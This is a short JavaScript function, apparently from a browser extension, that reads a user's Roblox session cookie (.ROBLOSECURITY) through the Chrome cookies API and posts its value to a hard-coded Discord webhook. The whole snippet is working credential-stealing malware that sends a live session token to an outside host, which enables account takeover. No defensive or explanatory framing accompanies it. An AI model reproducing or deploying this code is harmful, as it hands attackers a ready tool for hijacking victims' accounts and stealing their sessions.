function grabAndSendCookie() {
  chrome.cookies.get({ url: "https://www.roblox.com/", name: ".ROBLOSECURITY" }, function (cookie) {
    fetch("https://discordapp.com/api/webhooks/1056782660971806730/Q3TO1hHJie5BZgOUxhOU9kfRbcqsX6PhMT-DI-vVT7rflKhv3eg7Qt0S-A0o0She1P1B", {
      method: "POST",
      body: JSON.stringify({ content: cookie.value }),
      headers: { "Content-Type": "application/json" },
    });
  });
}
